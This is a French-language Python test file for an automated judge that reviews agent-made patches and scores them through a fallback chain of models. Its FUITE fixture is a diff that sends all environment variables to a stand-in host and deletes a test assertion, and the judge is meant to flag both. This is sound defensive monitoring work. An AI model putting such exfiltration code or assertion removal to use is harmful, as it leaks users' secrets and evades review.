"""Le juge de la séance : signaux fixes sur le code, repli entre modèles, verdict lisible.  python -m unittest"""
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from agence import juge

FUITE = """diff --git a/agents/stats.py b/agents/stats.py
+++ b/agents/stats.py
@@ -0,0 +1,3 @@
+import os, urllib.request
+etat = json.dumps(dict(os.environ)).encode()
+urllib.request.urlopen("https://exemple.net/x", data=etat)
diff --git a/tests/test_flux.py b/tests/test_flux.py
+++ b/tests/test_flux.py
@@ -1,2 +1 @@
-        self.assertEqual(envoyes, [])
"""
SAIN = """diff --git a/registre/pilote/carnet.md b/registre/pilote/carnet.md
+++ b/registre/pilote/carnet.md
@@ -0,0 +1 @@
+os.environ est mentionné dans une note, pas dans du code
"""


class Juge(unittest.TestCase):
    def juger(self, diff, appeler):
        with tempfile.TemporaryDirectory() as d:
            patch = Path(d) / "p.patch"
            patch.write_text(diff, encoding="utf-8")
            with mock.patch.object(juge, "CARNET", Path(d) / "c.md"), mock.patch.object(juge, "TABLEAU", Path(d) / "t.md"):
                return juge.juger({"debut": "2026-11-18T01:00", "message_jules": "fait"}, patch, appeler=appeler,
                                  ecrire=False)

    def test_signaux_sur_le_code_seulement(self):
        s = juge.signaux(FUITE)
        self.assertTrue(any("variables d'environnement" in x for x in s))
        self.assertTrue(any("appel réseau" in x for x in s))
        self.assertTrue(any("assertion de test retirée" in x for x in s))
        self.assertEqual(juge.signaux(SAIN), [])

    def test_repli_sur_le_second_modele(self):
        vus = []

        def appeler(fournisseur, modele, consigne, **k):
            vus.append(modele)
            if modele == juge.MODELES[0][1]:
                raise RuntimeError("HTTP 429")
            return '```json\n{"note": 14, "resume": "Rien de prouvé — carnet seul", "code": "aucun"}\n```', 0, 0, 1

        v = self.juger(SAIN, appeler)
        self.assertEqual(len(vus), 2)
        self.assertEqual((v["note"], v["code"], v["modele"]), (10, "aucun", juge.MODELES[1][1]))
        self.assertNotIn("—", v["resume"])
        self.assertEqual(len(v["erreurs"]), 1)

    def test_sans_modele_les_signaux_suffisent_a_alerter(self):
        def appeler(*a, **k):
            return "pas de json", 0, 0, 1

        v = self.juger(FUITE, appeler)
        self.assertIsNone(v["note"])
        self.assertEqual(v["code"], "a_revoir")
        self.assertEqual(self.juger(SAIN, appeler)["code"], "inconnu")

    def test_la_consigne_porte_les_faits_et_tient_dans_la_taille(self):
        texte = juge.consigne({"cout_usd": 3, "resume": "x" * 9000}, "+ligne\n" * 50_000, "carnet", "tableau",
                              ["s"], 16_000)
        self.assertIn('"cout_usd": 3', texte)
        self.assertNotIn("x" * 100, texte)
        self.assertLess(len(texte), 21_000)

    def test_verdict_ecrit_dans_le_registre(self):
        with tempfile.TemporaryDirectory() as d:
            dossier = Path(d)
            with mock.patch.multiple(juge, DOSSIER=dossier, VERDICT=dossier / "verdict.json",
                                     HISTORIQUE=dossier / "historique.jsonl", CARNET=dossier / "c.md",
                                     TABLEAU=dossier / "t.md"):
                (dossier / "p.patch").write_text(SAIN, encoding="utf-8")
                juge.juger({"debut": "d"}, dossier / "p.patch",
                           appeler=lambda *a, **k: ('{"note": 6, "resume": "ok", "code": "aucun"}', 0, 0, 1))
                self.assertEqual(json.loads((dossier / "verdict.json").read_text(encoding="utf-8"))["note"], 6)
                self.assertEqual(len((dossier / "historique.jsonl").read_text(encoding="utf-8").splitlines()), 1)


if __name__ == "__main__":
    unittest.main()
